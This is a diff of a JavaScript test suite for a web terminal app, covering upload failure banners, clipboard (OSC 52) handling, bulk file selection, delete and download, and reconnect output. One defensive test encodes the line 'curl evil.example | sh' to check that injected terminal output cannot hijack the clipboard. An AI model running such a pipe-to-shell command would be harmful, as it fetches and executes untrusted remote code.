   const text = p.el.querySelector('[data-upload-progress] .upload-progress-text');
-  ok(text.textContent === 'Upload failed: the file was uploaded to your home folder but could not be moved into the current directory',
+  // The bytes are in $HOME/<tmp>; the banner now names that file AND the
+  // server's reason ("control socket not ready" here) instead of a fixed
+  // sentence about "the current directory".
+  ok(/^Upload failed: saved to your home folder as \.websh-tmp-[a-z0-9-]+, but the connection to the host is not ready yet$/.test(text.textContent),
      'finalize-fail message; got ' + JSON.stringify(text.textContent));
   ok(text.textContent.indexOf('$HOME') === -1, 'no $HOME jargon');
   ok(text.textContent.indexOf('control socket') === -1, 'no raw server string');
@@ -5082,6 +5577,59 @@ test('renderSaved coerces a non-numeric port to a number (no injection)', async 
 // OSC 52 clipboard handler: decode multibyte UTF-8 via TextDecoder (not the
 // deprecated escape()), and refuse a pathologically large payload from a
 // (possibly hostile) remote host.
+test('the X on a failed upload banner dismisses it and keeps the staged file', async () => {
+  // After a failed move the banner says the bytes are safe in $HOME; the
+  // X stayed visible for 6 s and clicking it POSTed upload_cancel for
+  // that exact tmp file - the only copy - which the server deleted.
+  const plan = FB_PLAN(FB_ENTRIES, '/home/alice').concat([
+    {action: 'upload_finalize', response: {error: 'Permission denied'}},
+    {action: 'upload_cancel', response: {ok: true}},
+  ]);
+  const env = await mkEnv(plan); const win = env.win;
+  okXhr(win);
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  win.fbStartUpload([fakeFile('a.txt', 3)]);
+  await sleep(60);
+  const text = () => p.el.querySelector('[data-upload-progress] .upload-progress-text').textContent;
+  ok(/saved to your home folder/.test(text()), 'failure banner shown; got ' + text());
+  win.cancelTransfer(p.id);                       // the user clicks X
+  await sleep(20);
+  ok(!env.log.some(r => r.action === 'upload_cancel'), 'staged file NOT deleted');
+  ok(!p.upload, 'banner dismissed, slot free');
+  ok(!/Cancelled/.test(text()), 'not relabelled "Cancelled"');
+  // A new upload right away is not clobbered by the old banner's timer.
+  win.fbStartUpload([fakeFile('b.txt', 3)]);
+  ok(p.upload && p.upload.files[0].name === 'b.txt', 'new upload started');
+  cleanup(env);
+});
+
+test('OSC 52 from plain output cannot replace the clipboard', async () => {
+  // The handler was always on: `tail -f` of a log carrying an injected
+  // ESC]52 sequence silently put an attacker's command line on the
+  // clipboard, and turning Auto-copy off did not stop it.
+  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
+  const win = env.win;
+  const p = win.createPane(win.document.getElementById('panes'));
+  const copies = [];
+  win.copyText = (t) => copies.push(t);
+  const evil = win.btoa('curl evil.example | sh');
+  ok(p.term.parser._fireOsc(52, 'c;' + evil) === true, 'sequence consumed');
+  ok(copies.length === 0, 'no gesture -> clipboard untouched; got ' + JSON.stringify(copies));
+  // A real copy (right after the user selects) still works...
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));
+  p.term.parser._fireOsc(52, 'c;' + win.btoa('ok'));
+  ok(copies.length === 1 && copies[0] === 'ok', 'copy after a selection works');
+  // ...unless Auto-copy is off.
+  win.settings.tmuxClipboard = false;
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));
+  p.term.parser._fireOsc(52, 'c;' + win.btoa('no'));
+  ok(copies.length === 1, 'Auto-copy off -> no remote clipboard writes');
+  win.settings.tmuxClipboard = true;
+  cleanup(env);
+});
+
 test('OSC 52 decodes UTF-8 clipboard text correctly', async () => {
   const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
   const win = env.win;
@@ -5091,6 +5639,7 @@ test('OSC 52 decodes UTF-8 clipboard text correctly', async () => {
   win.copyText = (t) => { captured = t; };
   const utf8 = '→ café ✓';
   const b64 = win.btoa(unescape(encodeURIComponent(utf8)));
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
   const handled = p.term.parser._fireOsc(52, '0;' + b64);
   ok(handled === true, 'OSC 52 handled; got ' + handled);
   ok(captured === utf8, 'decoded UTF-8 exactly; got ' + JSON.stringify(captured));
@@ -5128,12 +5677,14 @@ test('OSC 52 preserves a leading BOM and keeps raw bytes on invalid UTF-8', asyn
   // leading BOM, so this asserts ignoreBOM keeps it.
   const bom = String.fromCharCode(0xFEFF) + 'hi';
   let b64 = win.btoa(unescape(encodeURIComponent(bom)));
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
   ok(p.term.parser._fireOsc(52, '0;' + b64) === true, 'BOM payload handled');
   ok(captured === bom, 'leading BOM preserved; got ' + JSON.stringify(captured));
   // Lone 0x80 is not valid UTF-8: fatal:true throws and the catch keeps the
   // raw latin1 byte rather than substituting U+FFFD.
   captured = null;
   b64 = win.btoa(String.fromCharCode(0x80));
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
   ok(p.term.parser._fireOsc(52, '0;' + b64) === true, 'invalid-byte payload handled');
   ok(captured === '\x80', 'raw latin1 kept on invalid UTF-8; got ' + JSON.stringify(captured));
   cleanup(env);
@@ -6105,7 +6656,7 @@ test('isolate_storage: font link refreshes to the path-scoped family at boot (#1
      + link.getAttribute('href'));
   ok(!/JetBrains\+Mono/.test(link.getAttribute('href')),
      'default family must not stay active under isolate_storage');
-  dom.window.close();
+  await closeDom(dom);
 });
 
 test('transportFatal no-ops on a torn-down transport (stale reconnect guard, #134)', async () => {
@@ -6476,7 +7027,7 @@ test('isolate_storage: the login screen never paints another deployment\'s saved
   const after = win.document.getElementById('savedList').textContent;
   ok(/MINE/.test(after) && !/OTHER-DEPLOYMENT/.test(after),
      'path-scoped cards after config; got ' + JSON.stringify(after));
-  dom.window.close();
+  await closeDom(dom);
 });
 
 test('api(): a non-JSON reply becomes a readable error, not "Unexpected token <"', async () => {
@@ -6643,22 +7194,623 @@ test('drag-and-drop: the highlight never gets stuck after a cancelled drag', asy
   cleanup(env);
 });
 
+// ── Picking several entries at once ─────────────────────────────────
+// Before this the browser could only act on one row at a time: clearing
+// out twenty files meant twenty confirmations.
+const pick = (win, name, shift) => {
+  const row = rowFor(win, name);
+  const ck = row.querySelector('.fb-ck');
+  const ev = new win.MouseEvent('click', {bubbles: true, cancelable: true,
+                                          shiftKey: !!shift});
+  ck.dispatchEvent(ev);
+  return row;
+};
+
+test('file browser: checkboxes pick rows without opening or downloading them', async () => {
+  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  const bar = $(win, 'fbSel');
+  ok(bar.classList.contains('h'), 'no action strip until something is picked');
+  ok(!rowFor(win, '..').querySelector('.fb-ck'), '".." has no checkbox');
+
+  const lsBefore = env.log.filter(r => r.action === 'ls').length;
+  pick(win, 'zeta.txt');
+  ok(!bar.classList.contains('h'), 'strip appears');
+  ok(/1 file selected/.test($(win, 'fbSelN').textContent),
+     'counts what is picked; got ' + $(win, 'fbSelN').textContent);
+  ok(rowFor(win, 'zeta.txt').classList.contains('fb-picked'), 'row marked');
+  // The click must not have navigated or started a transfer.
+  ok(env.log.filter(r => r.action === 'ls').length === lsBefore, 'did not navigate');
+  ok(!p.download, 'did not start a download');
+
+  pick(win, 'adir');
+  ok(/1 file, 1 folder selected/.test($(win, 'fbSelN').textContent),
+     'files and folders counted apart; got ' + $(win, 'fbSelN').textContent);
+  pick(win, 'zeta.txt');           // toggle back off
+  ok(/1 folder selected/.test($(win, 'fbSelN').textContent), 'toggles off again');
+  cleanup(env);
+});
+
+test('file browser: shift-click picks the run between two rows', async () => {
+  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  // Default order is newest-first with directories pinned on top.
+  const order = Array.from($(win, 'fbList').querySelectorAll('.fb-row'))
+    .filter(r => r.dataset.parent !== '1').map(r => r.dataset.name);
+  pick(win, order[1]);
+  pick(win, order[3], true);
+  const picked = Array.from($(win, 'fbList').querySelectorAll('.fb-row.fb-picked'))
+    .map(r => r.dataset.name);
+  ok(picked.length === 3 && picked.join() === order.slice(1, 4).join(),
+     'the whole run is picked; got ' + picked.join());
+  cleanup(env);
+});
+
+test('file browser: a selection never outlives what is on screen', async () => {
+  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  pick(win, 'zeta.txt');
+  pick(win, 'alpha.txt');
+  ok(/2 files selected/.test($(win, 'fbSelN').textContent), 'two picked');
+  // Filtering one of them away must drop it: the strip may never count
+  // something the user cannot see.
+  $(win, 'fbFilter').value = 'zeta'; win.applyFbFilter();
+  ok(/1 file selected/.test($(win, 'fbSelN').textContent),
+     'hidden row left the selection; got ' + $(win, 'fbSelN').textContent);
+  $(win, 'fbFilter').value = ''; win.applyFbFilter();
+  ok(/1 file selected/.test($(win, 'fbSelN').textContent), 'and does not come back');
+  // A new listing starts clean - the same name elsewhere is a different file.
+  win.loadFbDir('/srv');
+  await sleep(40);
+  ok($(win, 'fbSel').classList.contains('h'), 'selection cleared on navigation');
+  cleanup(env);
+});
+
+test('file browser: bulk delete asks once, then deletes one by one', async () => {
+  const rm = [];
+  const plan = FB_PLAN(FB_ENTRIES, '/home/alice').map(e => e.action === 'rm'
+    ? {action: 'rm', response: b => { rm.push(b.path);
+        return b.path.endsWith('mid.txt') ? {error: 'Permission denied'} : {ok: true}; }}
+    : e);
+  const env = await mkEnv(plan); const win = env.win;
+  const toasts = [];
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  win.showToast = (m, k) => toasts.push([k, m]);
+  pick(win, 'zeta.txt'); pick(win, 'mid.txt'); pick(win, 'alpha.txt');
+
+  win.fbAskBulkDelete();
+  ok(/Delete 3 items\?/.test($(win, 'fbSelN').textContent),
+     'one question for the batch; got ' + $(win, 'fbSelN').textContent);
+  ok(rm.length === 0, 'nothing deleted before the answer');
+  // Cancel puts the strip back without deleting anything.
+  Array.from($(win, 'fbSelActs').querySelectorAll('button'))
+    .find(b => b.textContent === 'Cancel').click();
+  ok(/3 files selected/.test($(win, 'fbSelN').textContent), 'cancel restores the strip');
+  ok(rm.length === 0, 'cancel deleted nothing');
+
+  win.fbAskBulkDelete();
+  Array.from($(win, 'fbSelActs').querySelectorAll('button'))
+    .find(b => /^Delete 3$/.test(b.textContent)).click();
+  await sleep(80);
+  ok(rm.length === 3, 'one rm per entry; got ' + rm.length);
+  ok(rm.every(path => /^\/home\/alice\//.test(path)),
+     'absolute paths in the listed directory; got ' + rm.join());
+  // One failed: the others still went, and the user is told which failed.
+  const err = toasts.find(t => t[0] === 'err');
+  ok(err && /Deleted 2 of 3/.test(err[1]) && /mid\.txt/.test(err[1]),
+     'summary names the failure; got ' + JSON.stringify(err));
+  ok($(win, 'fbSel').classList.contains('h'), 'selection cleared afterwards');
+  cleanup(env);
+});
+
+test('file browser: bulk delete stops when the server says rate-limited', async () => {
+  let n = 0;
+  const plan = FB_PLAN(FB_ENTRIES, '/home/alice').map(e => e.action === 'rm'
+    ? {action: 'rm', response: () => (++n > 1
+        ? {error: 'rate_limited', code: 'rate_limited'} : {ok: true})}
+    : e);
+  const env = await mkEnv(plan); const win = env.win;
+  const toasts = [];
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  win.showToast = (m, k) => toasts.push([k, m]);
+  pick(win, 'zeta.txt'); pick(win, 'mid.txt'); pick(win, 'alpha.txt');
+  win.fbAskBulkDelete();
+  Array.from($(win, 'fbSelActs').querySelectorAll('button'))
+    .find(b => /^Delete 3$/.test(b.textContent)).click();
+  await sleep(80);
+  ok(n === 2, 'stopped hammering after the refusal; got ' + n + ' calls');
+  const warn = toasts.find(t => t[0] === 'warn');
+  ok(warn && /deleted 1 of 3/.test(warn[1]),
+     'says how far it got; got ' + JSON.stringify(warn));
+  cleanup(env);
+});
+
+test('file browser: bulk download runs one at a time and skips folders', async () => {
+  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  const toasts = [];
+  win.showToast = (m, k) => toasts.push([k, m]);
+  // Record the order and prove only one transfer is ever in flight.
+  const started = [];
+  let live = 0, overlap = false;
+  win.startFastDownload = (id, path, o) => {
+    started.push(path);
+    if (live > 0) overlap = true;
+    live++;
+    return sleep(5).then(() => { live--; return true; });
+  };
+  pick(win, 'zeta.txt'); pick(win, 'adir'); pick(win, 'alpha.txt');
+  win.fbBulkDownload();
+  await sleep(80);
+  ok(started.length === 2, 'folders skipped; got ' + started.join());
+  ok(!overlap, 'never two transfers at once');
+  ok(toasts.some(t => /Folders can/.test(t[1])), 'says why the folder was skipped');
+  ok(toasts.some(t => /Downloaded 2 files/.test(t[1])),
+     'reports the total; got ' + JSON.stringify(toasts));
+  cleanup(env);
+});
+
+// ── Review fixes: bulk download really queues, editors keep the checkbox ──
+test('bulk download: the second file starts once the first has settled', async () => {
+  // startFastDownload resolved as soon as the bytes were saved, but the
+  // pane's slot (p.download) is only released by settleTransfer's timer;
+  // the next call in the queue found it still taken and the whole batch
+  // stopped after one file with "Stopped at ...". Drive the real
+  // startFastDownload, not a stub.
+  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  const requested = [];
+  const inner = win.fetch;
+  win.fetch = (url, init) => {
+    const u = new URL(url, 'http://x/');
+    if (u.searchParams.get('action') !== 'download') return inner(url, init);
+    requested.push(u.searchParams.get('path'));
+    let sent = false;
+    return Promise.resolve({
+      ok: true, status: 200,
+      headers: {get: h => h === 'Content-Length' ? '4' : null},
+      body: {getReader: () => ({
+        read: () => Promise.resolve(sent ? {done: true}
+          : (sent = true, {done: false, value: new Uint8Array([1, 2, 3, 4])})),
+        cancel: () => {},
+      })},
+    });
+  };
+  win.URL.createObjectURL = () => 'blob:x';
+  win.URL.revokeObjectURL = () => {};
+  win.HTMLAnchorElement.prototype.click = () => {};   // no jsdom navigation
+  const toasts = [];
+  win.showToast = (m, k) => toasts.push([k, m]);
+  pick(win, 'zeta.txt'); pick(win, 'alpha.txt');
+  win.fbBulkDownload();
+  await sleep(900);                 // two transfers + two 250 ms settles
+  ok(requested.length === 2, 'both files requested; got ' + JSON.stringify(requested));
+  ok(requested.every(r => /^\/home\/alice\//.test(r)), 'absolute paths');
+  ok(!toasts.some(t => /Stopped at/.test(t[1])), 'no "Stopped at"; got ' + JSON.stringify(toasts));
+  ok(toasts.some(t => /Downloaded 2 files/.test(t[1])), 'reports both; got ' + JSON.stringify(toasts));
+  ok(p.download === null || p.download === undefined, 'slot released at the end');
+  cleanup(env);
+});
+
+test('file browser: the checkbox survives Cancel on a delete or rename editor', async () => {
+  // The editors restore the row with innerHTML, which recreates the
+  // checkbox without its listener; a click on it then bubbled to the
+  // row and downloaded the file instead of selecting it.
+  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  const dl = [];
+  win.startFastDownload = (id, path) => { dl.push(path); return Promise.resolve(true); };
+  // Delete editor, then Cancel.
+  let row = rowFor(win, 'zeta.txt');
+  row.querySelector('[data-fb-del]').click();
+  row.querySelector('.fb-cf-no').click();
+  pick(win, 'zeta.txt');
+  ok(rowFor(win, 'zeta.txt').classList.contains('fb-picked'), 'picked after a cancelled delete');
+  ok(dl.length === 0, 'and nothing was downloaded; got ' + JSON.stringify(dl));
+  ok(!$(win, 'fbOv').classList.contains('h'), 'browser still open');
+  // Rename editor, then Cancel.
+  row = rowFor(win, 'alpha.txt');
+  row.querySelector('[data-fb-ren]').click();
+  row.querySelector('.fb-ed-no').click();
+  pick(win, 'alpha.txt');
+  ok(rowFor(win, 'alpha.txt').classList.contains('fb-picked'), 'picked after a cancelled rename');
+  ok(dl.length === 0, 'still no download');
+  ok(/2 files selected/.test($(win, 'fbSelN').textContent), 'both counted');
+  cleanup(env);
+});
+
+test('a failed move after upload says where the file is and why', async () => {
+  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
+  const win = env.win;
+  const d = (err, u) => win.describeFinalizeError(err, u);
+  const u = {destDir: '/srv/www', currentTmp: '.websh-tmp-abc'};
+  ok(/\/srv\/www no longer exists/.test(d('no such file or directory', u)),
+     'missing folder named; got ' + d('no such file or directory', u));
+  ok(/no permission to write to \/srv\/www/.test(d('Permission denied', u)), 'permission');
+  ok(/no permission to write to \/srv\/www/.test(d('Read-only file system', u)), 'read-only');
+  ok(/\.websh-tmp-abc/.test(d('Permission denied', u)), 'tells where the bytes are');
+  ok(/not ready yet/.test(d('control socket not ready', u)), 'side channel');
+  ok(/moved to \/srv\/www \(finalize exit 1: boom\)/.test(d('finalize exit 1: boom', u)),
+     'unknown reasons are passed through; got ' + d('finalize exit 1: boom', u));
+  ok(/the current directory/.test(d('Permission denied', {currentTmp: 't'})),
+     'no chosen folder → the pane cwd wording');
+  ok(/moved to/.test(d(new TypeError('Failed to fetch'), u)), 'an Error object is handled too');
+  cleanup(env);
+});
+
+test('file browser: an upload whose move fails shows the server reason in the strip', async () => {
+  const plan = FB_PLAN(FB_ENTRIES, '/home/alice').concat([
+    {action: 'upload_finalize', response: {error: 'no such file or directory'}},
+  ]);
+  const env = await mkEnv(plan); const win = env.win;
+  okXhr(win);
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  win.fbStartUpload([fakeFile('a.txt', 3)]);
+  await sleep(60);
+  const text = $(win, 'fbXfer').querySelector('.fb-xfer-text').textContent;
+  ok(/Upload failed: saved to your home folder/.test(text) && /\/home\/alice no longer exists/.test(text),
+     'reason and folder in the strip; got ' + JSON.stringify(text));
+  cleanup(env);
+});
+
+// ── Upload into the directory the file browser is showing ───────────
+// Before this, an upload always landed wherever the shell happened to
+// be standing - so the one place the user could not send a file to was
+// the folder they had just opened in the browser.
+
+// Minimal XHR that always succeeds, so tests exercise the finalize step.
+function okXhr(win) {
+  win.XMLHttpRequest = class {
+    constructor() { this.upload = {}; this.status = 200; this.responseText = '{"ok":true}'; }
+    open() {} setRequestHeader() {} abort() {}
+    send() { if (this.onload) this.onload(); }
+  };
+}
+const FB_UPLOAD_PLAN = (path) => FB_PLAN(FB_ENTRIES, path).concat([
+  {action: 'upload_finalize',
+   response: b => ({ok: true, path: (b.dir || '/elsewhere') + '/' + b.final})},
+]);
+const fakeFile = (name, size) => ({name: name, size: size || 4});
+
+test('file browser: an upload lands in the folder on screen, not the shell cwd', async () => {
+  // The first listing answers /home/alice, the next one /srv/www - the
+  // fake server echoes no paths, so the moves are scripted.
+  const plan = [
+    {action: 'config', response: {restrict_hosts: false, connections: []}},
+    {action: 'connect', response: {session_id: 'sa', alive: true}},
+    {action: 'resize', response: {ok: true}},
+    {action: 'output', response: {data: '', alive: true}},
+    {action: 'ls', response: {path: '/home/alice', entries: FB_ENTRIES}, once: true},
+    {action: 'ls', response: {path: '/srv/www', entries: FB_ENTRIES}},
+    {action: 'upload_finalize',
+     response: b => ({ok: true, path: (b.dir || '/elsewhere') + '/' + b.final})},
+  ];
+  const env = await mkEnv(plan); const win = env.win;
+  okXhr(win);
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  // Navigate somewhere else first: the destination must follow the
+  // browser, not the directory it opened at.
+  win.loadFbDir('/srv/www');
+  await sleep(40);
+  ok($(win, 'fbPath').getAttribute('data-path') === '/srv/www', 'browser moved');
+  const lsBefore = env.log.filter(r => r.action === 'ls').length;
+
+  win.fbStartUpload([fakeFile('report.csv', 12)]);
+  await sleep(60);
+  const fin = env.log.filter(r => r.action === 'upload_finalize');
+  ok(fin.length === 1, 'one finalize call; got ' + fin.length);
+  ok(fin[0].body.dir === '/srv/www',
+     'finalize names the directory on screen; got ' + fin[0].body.dir);
+  ok(fin[0].body.final === 'report.csv', 'and the original file name');
+  // A non-persistent pane used to be sent an `mv` as keystrokes; with a
+  // named destination the server does it, so nothing is typed.
+  ok(!env.log.some(r => r.action === 'input'), 'nothing typed into the terminal');
+  // The listing refreshes so the file is simply there.
+  ok(env.log.filter(r => r.action === 'ls').length > lsBefore,
+     'directory listed again after the file landed');
+  cleanup(env);
+});
+
+test('file browser: the transfer is visible while the browser covers the pane', async () => {
+  const env = await mkEnv(FB_UPLOAD_PLAN('/home/alice')); const win = env.win;
+  // An XHR that reports progress but never completes, so the strip can
+  // be inspected mid-flight.
+  win.XMLHttpRequest = class {
+    constructor() { this.upload = {}; this.status = 200; this.responseText = '{"ok":true}'; }
+    open() {} setRequestHeader() {} abort() {}
+    send() { if (this.upload.onprogress) this.upload.onprogress({loaded: 50}); }
+  };
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  const strip = $(win, 'fbXfer');
+  ok(strip.classList.contains('h'), 'no strip while nothing is transferring');
+  win.fbStartUpload([fakeFile('big.bin', 100)]);
+  await sleep(20);
+  ok(!strip.classList.contains('h'), 'strip shown during the upload');
+  ok(/big\.bin/.test(strip.querySelector('.fb-xfer-text').textContent),
+     'names the file; got ' + strip.querySelector('.fb-xfer-text').textContent);
+  ok(strip.querySelector('.fb-xfer-bar').style.width === '50%',
+     'mirrors the pane bar; got ' + strip.querySelector('.fb-xfer-bar').style.width);
+  // Cancelling from the browser cancels the pane's transfer.
+  win.fbCancelXfer();
+  await sleep(5);
+  ok(/Cancelled/.test(strip.querySelector('.fb-xfer-text').textContent),
+     'cancel reaches the pane; got ' + strip.querySelector('.fb-xfer-text').textContent);
+  cleanup(env);
+});
+
+test('file browser: refuses an upload it cannot aim, and says why', async () => {
+  const env = await mkEnv(FB_UPLOAD_PLAN('/home/alice')); const win = env.win;
+  okXhr(win);
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  const toasts = [];
+  win.showToast = (m, k) => toasts.push(m);
+
+  // A transfer already running in this pane.
+  p.upload = {files: [], fileIndex: 0};
+  win.fbStartUpload([fakeFile('a.txt')]);
+  ok(/already running/i.test(toasts.pop() || ''), 'busy pane refused with a reason');
+  p.upload = null;
+
+  // Rows that belong to a session this pane no longer has: the path on
+  // screen may not exist on the host we would be uploading to.
+  const realSid = p.sid;
+  p.sid = 'other-sid';
+  win.fbStartUpload([fakeFile('a.txt')]);
+  ok(/still loading/i.test(toasts.pop() || ''), 'stale listing refused');
+  p.sid = realSid;
+
+  // Nothing at all selected is a no-op, not an error.
+  win.fbStartUpload([]);
+  ok(toasts.length === 0, 'empty selection says nothing');
+  ok(!env.log.some(r => r.action === 'upload_finalize'), 'no upload was attempted');
+  cleanup(env);
+});
+
+test('file browser: dropping files on the panel uploads into that folder', async () => {
+  const env = await mkEnv(FB_UPLOAD_PLAN('/home/alice')); const win = env.win;
+  okXhr(win);
+  const p = await _onePane(win);
+  win.showFileBrowser(p.id);
+  await sleep(40);
+  const panel = win.document.querySelector('#fbOv .fb-panel');
+  const dt = {types: ['Files'], files: [fakeFile('dropped.bin', 9)], items: null,
+              dropEffect: ''};
+  const ev = (type) => {
+    const e = new win.Event(type, {bubbles: true, cancelable: true});
+    e.dataTransfer = dt;
+    panel.dispatchEvent(e);
+    return e;
+  };
+  ev('dragenter');
+  ok(panel.classList.contains('drop-target'), 'panel highlights for a file drag');
+  ok(/\/home\/alice/.test(panel.getAttribute('data-drop-msg')),
+     'the prompt names the destination; got ' + panel.getAttribute('data-drop-msg'));
+  const dropped = ev('drop');
+  await sleep(60);
+  ok(dropped.defaultPrevented, 'the browser must not navigate to the file');
+  ok(!panel.classList.contains('drop-target'), 'highlight cleared after the drop');
+  const fin = env.log.filter(r => r.action === 'upload_finalize');
+  ok(fin.length === 1 && fin[0].body.dir === '/home/alice',
+     'uploaded into the shown directory; got ' + JSON.stringify(fin.map(f => f.body.dir)));
+  cleanup(env);
+});
+
 test('drag-and-drop frame is its own layer above the terminal, not an outline', async () => {
   // An `outline` on .pane paints UNDER xterm's positioned render layers:
   // only the top (pane bar) and bottom strip of the frame were visible.
   // The frame must be a pseudo-element stacked above the terminal.
   const css = html;
   ok(!/\.pane\.drop-target\{[^}]*outline/.test(css), 'no outline-based frame on .pane.drop-target');
-  const before = (css.match(/\.pane\.drop-target::before\{([^}]*)\}/) || [])[1] || '';
+  // The rule is shared with the file browser's panel, so match the
+  // declaration block by its selector list rather than an exact string.
+  const before = (css.match(/\.pane\.drop-target::before[^{]*\{([^}]*)\}/) || [])[1] || '';
   ok(/border:2px dashed/.test(before), 'dashed frame drawn by ::before');
   const z = +((before.match(/z-index:(\d+)/) || [])[1] || 0);
   ok(z > 20, 'frame stacks above the terminal layers (z-index ' + z + ' > 20)');
   ok(/inset:\d+px/.test(before), 'frame spans the whole pane');
 });
 
+test('lossless reconnect: replayed output is trimmed by cursor, gaps are announced', async () => {
+  const env = await mkEnv(FB_PLAN([], '/home/alice')); const win = env.win;
+  const p = await _onePane(win);
+  ok(p.outCursor === 0, 'a new session starts at cursor 0');
+  const out = [];
+  p.term.write = (b) => { out.push(typeof b === 'string' ? b : Buffer.from(b).toString('latin1')); };
+  const b64 = t => Buffer.from(t, 'latin1').toString('base64');
+  const frame = (text, cursor, extra) =>
+    win.handleOutputPayload(p, Object.assign({data: b64(text), alive: true, cursor}, extra || {}), p.sid);
+  frame('hello ', 6);
+  frame('world', 11);
+  ok(out.join('') === 'hello world' && p.outCursor === 11, 'in-order frames written; cursor 11');
+  // After a reconnect the server replays from an older cursor (e.g.
+  // EventSource re-sent its original URL): only the new tail is printed.
+  frame('world!!', 13);
+  ok(out.join('') === 'hello world!!', 'overlap trimmed; got ' + JSON.stringify(out.join('')));
+  frame('world!!', 13);
+  ok(out.join('') === 'hello world!!', 'a full duplicate prints nothing');
+  // Bytes that fell out of the server's window are announced, not faked.
+  frame('tail', 5017, {lost: 5000});
+  ok(/5000 bytes of output were produced while disconnected/.test(out.join('')), 'gap announced');
+  ok(out.join('').endsWith('tail') && p.outCursor === 5017, 'then the retained bytes');
+  // reset: the server didn't know our cursor - take its data as-is.
+  frame('fresh', 5, {reset: true});
+  ok(out.join('').endsWith('fresh') && p.outCursor === 5, 'reset adopts the server cursor');
+  // Frames without a cursor (older server) are written as before.
+  win.handleOutputPayload(p, {data: b64('legacy'), alive: true}, p.sid);
+  ok(out.join('').endsWith('legacy'), 'cursor-less frames still render');
+  // The stream URL carries the cursor.
+  let seen = null;
+  const RealES = win.EventSource;
+  win.EventSource = function (url) { seen = url; this.addEventListener = () => {}; this.close = () => {}; };
+  win.closeStream(p); win.streamOutput(p);
+  ok(seen && /[?&]since=5\b/.test(seen), 'stream URL resumes from the cursor; got ' + seen);
+  win.EventSource = RealES;
+  win.endSession(p, {});
+  ok(p.outCursor === 0, 'endSession resets the cursor');
+  cleanup(env);
+});
+
+test('UI chrome: one icon set, dark scrollbars, a quiet accent on the active pane', async () => {
+  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
+  const p = await _onePane(win);
+  // Every button icon comes from the sprite - no emoji, no ad-hoc glyphs.
+  // Comments mention both emoji and scrollbar-color on purpose; test the code.
+  const code = html.replace(/\/\*[\s\S]*?\*\//g, '').replace(/<!--[\s\S]*?-->/g, '');
+  ok(/color-scheme:\s*dark/.test(code), 'dark color-scheme for native controls');
+  ok(/\*::-webkit-scrollbar\{/.test(code), 'scrollbars styled app-wide');
+  ok(!/scrollbar-color/.test(code),
+     'no inherited scrollbar-color (it overrides the webkit rules in Chromium)');
+  ok(/\.pane\.active>\.pane-bar>\.pane-label\{color:var\(--ac\)\}/.test(code),
+     'active pane is marked on its name only');
+  const symbols = (code.match(/<symbol id="i-/g) || []).length;
+  ok(symbols >= 15, 'icon sprite present (' + symbols + ' symbols)');
+  // The gear must be a cog, not the "circle + straight rays" that reads as a
+  // sun, and Export must be a document (it writes a file), not a bare arrow.
+  const gear = code.match(/<symbol id="i-gear"[\s\S]*?<\/symbol>/)[0];
+  ok(/A10 10 0/.test(gear) && !/M12 2\.8v2\.4/.test(gear), 'Options icon is a toothed cog');
+  const exp = code.match(/<symbol id="i-export"[\s\S]*?<\/symbol>/)[0];
+  ok(/M13\.4 3\.6v5h5/.test(exp), 'Export icon is a document with a down arrow');
+  ok(!/[\u{1F300}-\u{1FAFF}]/u.test(code), 'no emoji left in the markup');
+  const paneIcons = p.el.querySelectorAll('.pane-bar svg.ic use');
+  ok(paneIcons.length === 6, 'pane bar buttons (5 + transfer cancel) use the sprite; got ' + paneIcons.length);
+  ok(Array.from(paneIcons).every(u => /^#i-/.test(u.getAttribute('href'))), 'each references a symbol');
+  // File rows: icon by type, actions as icons with their labels intact.
+  win.showFileBrowser(p.id);
+  await sleep(30);
+  const dir = rowFor(win, 'adir'), file = rowFor(win, 'zeta.txt');
+  ok(dir.dataset.type === 'd' && file.dataset.type === 'f', 'row type exposed for styling');
+  ok(dir.querySelector('.fb-ic use').getAttribute('href') === '#i-folder', 'folder icon');
+  ok(file.querySelector('.fb-ic use').getAttribute('href') === '#i-file', 'file icon');
+  const ren = file.querySelector('[data-fb-ren]');
+  ok(ren.querySelector('use').getAttribute('href') === '#i-pencil' &&
+     ren.getAttribute('aria-label') === 'Rename zeta.txt', 'icon button keeps its label');
+  cleanup(env);
+});
+
+test('status bars float over the terminal instead of resizing it', async () => {
+  // In the pane's flex column each bar shrank the terminal: the output
+  // jumped, xterm refit and the PTY was resized mid-disconnect - then
+  // again when the bar was hidden.
